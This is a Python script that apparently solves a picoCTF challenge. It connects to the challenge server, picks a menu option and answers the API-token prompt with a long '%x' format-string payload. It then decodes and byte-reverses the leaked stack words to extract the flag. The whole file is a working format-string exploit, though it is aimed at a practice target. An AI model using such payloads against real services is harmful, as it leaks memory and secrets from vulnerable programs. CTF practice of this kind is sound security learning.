import socket
host="mercury.picoctf.net"
port=59616
timeout=5

check_string1="2) View my portfolio".encode()
check_string2="What is your API token?".encode()
input_string1="1\n".encode()
str1="%x"+"-%x"*70+"\n"
input_string2=str1.encode()
# socketを作成
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # 指定されたホストとポートに接続
    s.connect((host, port))
    s.settimeout(timeout)
    
    # サーバーからのレスポンスを読む
    recieved_data=b""
    
   
    while True:
        chunk = s.recv(4096)  # 4096は読み取りの最大バイト数。必要に応じて調整してください。
        if not chunk:
            break
        recieved_data+=chunk
        # レスポンスにcheck_stringが含まれる場合
        if check_string1 in recieved_data:
            # input_stringをサーバーに送信
            s.sendall(input_string1)
            print("String inputted!")
            print(recieved_data)
            recieved_data=b""
        if check_string2 in recieved_data:
            # input_stringをサーバーに送信
            s.sendall(input_string2)
            print("String inputted!")
            print(recieved_data)
            recieved_data=b""
        else:
            print(f"'{check_string1.decode()}' was not found in the response.")
    print(recieved_data)
    res=recieved_data.decode().split("-")[14:25]
    tmp_res=""
    result=""
    for i in res:
        string=bytes.fromhex(i).decode("ascii",errors="ignore")
        for char in string:
            tmp_res=char+tmp_res
        result+=tmp_res
        tmp_res=""
    print(result)
            